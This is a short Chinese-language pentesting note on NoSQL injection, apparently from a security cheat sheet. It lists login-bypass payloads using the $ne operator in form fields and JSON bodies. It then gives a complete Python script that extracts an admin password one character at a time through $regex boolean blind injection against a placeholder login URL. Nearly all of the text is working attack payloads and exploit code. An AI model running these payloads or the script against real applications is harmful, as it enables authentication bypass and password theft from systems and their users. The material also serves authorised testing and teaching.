## NoSQL 注入检测

### 检测方法

```http
# 1. 基础检测
username=admin&password=test        → 正常
username=admin&password[$ne]=test   → 绕过？（NoSQL 注入）

# 2. 参数类型变化
username=admin&password=test        → 正常
username[$ne]=admin&password=test   → 绕过？

# 3. JSON Content-Type 变化
# 将 POST body 改为 JSON
```

### 布尔盲注自动化脚本
```python
import requests
import string

url = "http://target.com/login"
chars = string.ascii_lowercase + string.digits
password = ""

for i in range(32):
    for c in chars:
        payload = {
            "username": "admin",
            "password": {"$regex": f"^{password}{c}.*"}
        }
        r = requests.post(url, json=payload)
        if "success" in r.text:
            password += c
            print(f"[+] 密码: {password}")
            break
```

